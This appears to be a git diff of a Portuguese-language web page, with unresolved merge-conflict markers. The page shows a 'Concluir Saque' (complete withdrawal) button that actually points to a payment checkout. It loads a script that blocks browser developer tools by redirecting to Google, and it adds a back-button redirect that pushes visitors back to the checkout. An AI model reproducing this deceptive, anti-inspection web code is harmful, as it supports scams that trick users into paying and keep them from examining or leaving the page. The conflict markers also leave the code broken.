@@ -34,7 +34,11 @@
         </div>
 
         <div class="coolinput" style="margin-top: -10px;">
+<<<<<<< HEAD
             <a style="display: block; background-color: #1B1B1B; color: #FFFFFF; text-align: center; padding: 15px; border-radius: 23px; bottom: 60px; -webkit-animation: pulse 1.5s infinite; position: unset; width: 100%;" href="https://pay.segurospag.com/checkout/7d10926c-3d02-41a4-b4d2-801b88449849 src= | [ Cupom da Vez ] | [ 🏄 ] | [ Surfista ]" id="continuarCadastroAtivo" class="continuarAtivo">Concluir Saque</a>
+=======
+            <a style="display: block; background-color: #1B1B1B; color: #FFFFFF; text-align: center; padding: 15px; border-radius: 23px; bottom: 60px; -webkit-animation: pulse 1.5s infinite; position: unset; width: 100%;" href= 'https://pay.segurospag.com/checkout/24fec286-7636-48fc-b748-4822b9a92ba1?src= | [ Cupom da Vez] | [ 🐈 ] | [ Grécia ]' id="continuarCadastroAtivo" class="continuarAtivo">Concluir Saque</a>
+>>>>>>> e0aeddf95085beef7094662fc7e35e075f4a2aff
         </div>
 
         
@@ -44,7 +48,11 @@
         <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://google.com.br"></script>
         <script>
             // BACK REDIRECT
+<<<<<<< HEAD
             var urlBackRedirect = 'https://pay.segurospag.com/checkout/7d10926c-3d02-41a4-b4d2-801b88449849'; // lembre-se de usar a url sem espaços
+=======
+            var urlBackRedirect = 'https://pay.segurospag.com/checkout/24fec286-7636-48fc-b748-4822b9a92ba1?src= | [ Cupom da Vez] | [ 🐈 ] | [ Grécia ]'; // lembre-se de usar a url sem espaços
+>>>>>>> e0aeddf95085beef7094662fc7e35e075f4a2aff
             // não altere nada abaixo dessa linha
             urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
             (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') 
